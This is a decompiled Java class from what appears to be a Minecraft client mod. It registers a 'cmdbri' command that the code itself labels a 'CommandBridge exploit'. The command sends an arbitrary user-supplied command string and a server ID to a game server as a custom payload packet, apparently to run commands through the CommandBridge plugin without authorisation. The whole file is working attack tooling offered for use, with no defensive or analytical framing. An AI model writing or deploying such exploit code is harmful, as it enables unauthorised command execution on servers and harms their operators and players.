package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.CMDBRIPayloadPacket;
import net.minecraft.class_2172;
import net.minecraft.class_2817;
import net.minecraft.class_310;

public class CMDBRICommand extends Command {
   public CMDBRICommand(class_310 minecraftClient) {
      super("cmdbri", "CommandBridge exploit", minecraftClient);
   }

   public LiteralArgumentBuilder<class_2172> build() {
      return (LiteralArgumentBuilder)((LiteralArgumentBuilder)literal(this.getName()).executes((context) -> {
         Helper.printChatMessage("Incomplete command!");
         return 1;
      })).then(((RequiredArgumentBuilder)argument("serverID", StringArgumentType.string()).executes((context) -> {
         Helper.printChatMessage("Incomplete command!");
         return 1;
      })).then(argument("command", StringArgumentType.greedyString()).executes((context) -> {
         Helper.sendPacket(new class_2817(new CMDBRIPayloadPacket((String)context.getArgument("command", String.class), (String)context.getArgument("serverID", String.class))));
         Helper.printChatMessage("Payload sent!");
         return 1;
      })));
   }
}
